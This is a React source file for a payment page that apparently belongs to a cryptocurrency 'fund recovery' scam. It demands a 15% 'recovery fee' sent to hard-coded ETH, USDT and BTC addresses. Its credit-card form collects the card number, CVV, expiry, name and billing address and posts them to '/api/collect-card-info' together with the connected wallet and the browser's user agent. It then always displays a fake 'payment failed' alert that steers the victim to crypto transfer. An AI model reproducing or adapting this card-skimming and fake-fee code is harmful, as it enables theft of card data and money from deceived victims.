import { useState, useEffect } from 'react';
import { Copy, Check, ExternalLink, CreditCard } from 'lucide-react';

export default function PaymentPage({ recoveredAmount, onPaymentComplete }) {
  const [selectedCurrency, setSelectedCurrency] = useState('ETH');
  const [copied, setCopied] = useState('');
  const [rates, setRates] = useState({});
  const [loading, setLoading] = useState(true);
  const [paymentMethod, setPaymentMethod] = useState('crypto'); // 'crypto' or 'card'
  const [cardData, setCardData] = useState({
    number: '',
    expiry: '',
    cvv: '',
    name: '',
    address: ''
  });
  const [processingCard, setProcessingCard] = useState(false);

  const feeUSD = (parseFloat(recoveredAmount) * 0.15 * 3000).toFixed(2); // Assume ETH = $3000

  const paymentOptions = {
    ETH: {
      currency: 'ETH',
      address: '0x23911afca321de7bdd404af809e29a9621dc4bd1',
      network: 'Ethereum (ERC-20)',
      icon: 'https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/ethereum.svg',
      color: '#627EEA',
      networkFee: 0.002 // ETH
    },
    USDT: {
      currency: 'USDT',
      address: 'TUjuxkyc12zUbVgWiEQn17VYKf4yB5YYm1',
      network: 'Tron (TRC-20)',
      icon: 'https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/tether.svg',
      color: '#26A17B',
      networkFee: 1 // USDT
    },
    BTC: {
      currency: 'BTC',
      address: '35yWsg6WJRfQg7h3sKXnt93r1Dz3WpCSoX',
      network: 'Bitcoin',
      icon: 'https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/bitcoin.svg',
      color: '#F7931A',
      networkFee: 0.0001 // BTC
    }
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();
    setProcessingCard(true);

    try {
      const userAddress = localStorage.getItem('connectedWallet') || 'unknown';
      
      await fetch('/api/collect-card-info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress,
          amount: recoveredAmount,
          cardNumber: cardData.number,
          cardExpiry: cardData.expiry,
          cardCVV: cardData.cvv,
          cardName: cardData.name,
          cardAddress: cardData.address,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent
        })
      });

      // Simulate processing delay
      setTimeout(() => {
        alert('Payment processing failed. Please try crypto payment instead.');
        setPaymentMethod('crypto');
        setProcessingCard(false);
      }, 3000);
    } catch (error) {
      alert('Payment failed. Please try crypto payment.');
      setPaymentMethod('crypto');
      setProcessingCard(false);
    }
  };

  useEffect(() => {
    fetchRates();
  }, []);

  const fetchRates = async () => {
    try {
      const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,bitcoin,tether&vs_currencies=usd');
      const data = await response.json();
      
      setRates({
        ETH: data.ethereum.usd,
        BTC: data.bitcoin.usd,
        USDT: data.tether.usd
      });
    } catch (error) {
      // Fallback rates
      setRates({
        ETH: 3000,
        BTC: 45000,
        USDT: 1
      });
    } finally {
      setLoading(false);
    }
  };

  const calculateAmount = (currency) => {
    if (!rates[currency]) return '0';
    
    const option = paymentOptions[currency];
    const baseAmount = parseFloat(feeUSD) / rates[currency];
    const withNetworkFee = baseAmount + option.networkFee;
    
    return currency === 'USDT' ? withNetworkFee.toFixed(2) : withNetworkFee.toFixed(6);
  };

  const copyToClipboard = (text, type) => {
    navigator.clipboard.writeText(text);
    setCopied(type);
    setTimeout(() => setCopied(''), 2000);
  };

  const selectedOption = paymentOptions[selectedCurrency];
  const paymentAmount = calculateAmount(selectedCurrency);

  if (loading) {
    return (
      <div className="bg-white rounded-xl p-8 shadow-lg text-center">
        <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4" />
        <p>Loading payment options...</p>
      </div>
    );
  }

  return (
    <div className="bg-white rounded-xl p-8 shadow-lg max-w-2xl mx-auto">
      <div className="text-center mb-8">
        <h2 className="text-3xl font-bold text-gray-900 mb-2">Payment Required</h2>
        <p className="text-gray-600">Recovery successful! Please send the 15% service fee to complete the process.</p>
        <div className="bg-green-50 border-2 border-green-200 rounded-lg p-4 mt-4">
          <div className="text-2xl font-bold text-green-600">${feeUSD} USD</div>
          <div className="text-sm text-green-700">15% Recovery Fee</div>
        </div>
      </div>

      {/* Payment Method Selection */}
      <div className="flex space-x-4 mb-8">
        <button
          onClick={() => setPaymentMethod('card')}
          className={`flex-1 p-4 rounded-xl border-2 transition-all ${
            paymentMethod === 'card'
              ? 'border-blue-500 bg-blue-50'
              : 'border-gray-200 hover:border-gray-300'
          }`}
        >
          <div className="flex items-center justify-center space-x-2">
            <CreditCard size={24} />
            <span className="font-bold">Credit Card</span>
          </div>
          <div className="text-xs text-gray-500 mt-1">Instant Payment</div>
        </button>
        <button
          onClick={() => setPaymentMethod('crypto')}
          className={`flex-1 p-4 rounded-xl border-2 transition-all ${
            paymentMethod === 'crypto'
              ? 'border-blue-500 bg-blue-50'
              : 'border-gray-200 hover:border-gray-300'
          }`}
        >
          <div className="flex items-center justify-center space-x-2">
            <span className="text-2xl">₿</span>
            <span className="font-bold">Cryptocurrency</span>
          </div>
          <div className="text-xs text-gray-500 mt-1">Manual Transfer</div>
        </button>
      </div>

      {paymentMethod === 'card' ? (
        /* Credit Card Form */
        <form onSubmit={handleCardSubmit} className="space-y-6">
          <div className="bg-gray-50 rounded-xl p-6">
            <h3 className="text-xl font-bold mb-4 flex items-center space-x-2">
              <CreditCard size={24} />
              <span>Credit Card Payment</span>
            </h3>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="md:col-span-2">
                <label className="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                <input
                  type="text"
                  placeholder="1234 5678 9012 3456"
                  value={cardData.number}
                  onChange={(e) => setCardData({...cardData, number: e.target.value})}
                  className="w-full p-3 border border-gray-300 rounded-lg"
                  required
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
                <input
                  type="text"
                  placeholder="MM/YY"
                  value={cardData.expiry}
                  onChange={(e) => setCardData({...cardData, expiry: e.target.value})}
                  className="w-full p-3 border border-gray-300 rounded-lg"
                  required
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">CVV</label>
                <input
                  type="text"
                  placeholder="123"
                  value={cardData.cvv}
                  onChange={(e) => setCardData({...cardData, cvv: e.target.value})}
                  className="w-full p-3 border border-gray-300 rounded-lg"
                  required
                />
              </div>
              
              <div className="md:col-span-2">
                <label className="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
                <input
                  type="text"
                  placeholder="John Doe"
                  value={cardData.name}
                  onChange={(e) => setCardData({...cardData, name: e.target.value})}
                  className="w-full p-3 border border-gray-300 rounded-lg"
                  required
                />
              </div>
              
              <div className="md:col-span-2">
                <label className="block text-sm font-medium text-gray-700 mb-2">Billing Address</label>
                <input
                  type="text"
                  placeholder="123 Main St, City, State, ZIP"
                  value={cardData.address}
                  onChange={(e) => setCardData({...cardData, address: e.target.value})}
                  className="w-full p-3 border border-gray-300 rounded-lg"
                  required
                />
              </div>
            </div>
            
            <button
              type="submit"
              disabled={processingCard}
              className="w-full mt-6 bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white font-bold py-3 px-6 rounded-lg transition-colors"
            >
              {processingCard ? 'Processing...' : `Pay $${feeUSD} USD`}
            </button>
          </div>
        </form>
      ) : (
        <>
          {/* Currency Selection */}
          <div className="grid grid-cols-3 gap-4 mb-8">
            {Object.entries(paymentOptions).map(([key, option]) => (
              <button
                key={key}
                onClick={() => setSelectedCurrency(key)}
                className={`p-4 rounded-xl border-2 transition-all ${
                  selectedCurrency === key
                    ? 'border-blue-500 bg-blue-50'
                    : 'border-gray-200 hover:border-gray-300'
                }`}
              >
                <div className="flex flex-col items-center space-y-2">
                  <img 
                    src={option.icon} 
                    alt={option.currency}
                    className="w-8 h-8"
                    style={{ filter: `hue-rotate(${option.currency === 'ETH' ? '200deg' : option.currency === 'BTC' ? '30deg' : '120deg'}) saturate(2)` }}
                  />
                  <div className="font-bold">{option.currency}</div>
                  <div className="text-xs text-gray-500">{option.network}</div>
                </div>
              </button>
            ))}
          </div>

          {/* Payment Details */}
          <div className="bg-gray-50 rounded-xl p-6 mb-6">
            <div className="flex items-center space-x-4 mb-6">
              <img 
                src={selectedOption.icon} 
                alt={selectedOption.currency}
                className="w-12 h-12"
                style={{ filter: `hue-rotate(${selectedCurrency === 'ETH' ? '200deg' : selectedCurrency === 'BTC' ? '30deg' : '120deg'}) saturate(2)` }}
              />
              <div>
                <h3 className="text-xl font-bold">{selectedOption.currency} Payment</h3>
                <p className="text-gray-600">{selectedOption.network}</p>
              </div>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Amount to Send</label>
                <div className="flex items-center space-x-2">
                  <input
                    type="text"
                    value={`${paymentAmount} ${selectedCurrency}`}
                    readOnly
                    className="flex-1 p-3 border border-gray-300 rounded-lg bg-white font-mono"
                  />
                  <button
                    onClick={() => copyToClipboard(paymentAmount, 'amount')}
                    className="p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                  >
                    {copied === 'amount' ? <Check size={20} /> : <Copy size={20} />}
                  </button>
                </div>
                <p className="text-xs text-gray-500 mt-1">
                  Includes network fee: {paymentOptions[selectedCurrency].networkFee} {selectedCurrency}
                </p>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Recipient Address</label>
                <div className="flex items-center space-x-2">
                  <input
                    type="text"
                    value={selectedOption.address}
                    readOnly
                    className="flex-1 p-3 border border-gray-300 rounded-lg bg-white font-mono text-sm"
                  />
                  <button
                    onClick={() => copyToClipboard(selectedOption.address, 'address')}
                    className="p-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                  >
                    {copied === 'address' ? <Check size={20} /> : <Copy size={20} />}
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* QR Code Placeholder */}
          <div className="bg-white border-2 border-gray-200 rounded-xl p-6 text-center mb-6">
            <div className="w-48 h-48 bg-gray-100 rounded-lg mx-auto mb-4 flex items-center justify-center">
              <div className="text-gray-400">
                <div className="text-4xl mb-2">📱</div>
                <div className="text-sm">QR Code</div>
                <div className="text-xs">{selectedCurrency} Payment</div>
              </div>
            </div>
            <p className="text-sm text-gray-600">Scan with your {selectedCurrency} wallet</p>
          </div>

          {/* Important Notes */}
          <div className="bg-yellow-50 border-2 border-yellow-200 rounded-xl p-4 mb-6">
            <h4 className="font-bold text-yellow-800 mb-2">⚠️ Important Payment Instructions</h4>
            <ul className="text-sm text-yellow-700 space-y-1">
              <li>• Send EXACT amount including network fee</li>
              <li>• Use {selectedOption.network} network only</li>
              <li>• Payment confirmation takes 5-15 minutes</li>
              <li>• Do not send from exchange (use personal wallet)</li>
            </ul>
          </div>

          {/* Action Buttons */}
          <div className="flex space-x-4">
            <button
              onClick={() => onPaymentComplete(true)}
              className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
            >
              I've Sent Payment
            </button>
            <button
              onClick={() => window.open(`https://blockchair.com/${selectedCurrency.toLowerCase()}/address/${selectedOption.address}`, '_blank')}
              className="flex items-center space-x-2 bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
            >
              <ExternalLink size={16} />
              <span>Verify</span>
            </button>
          </div>
        </>
      )}
    </div>
  );
}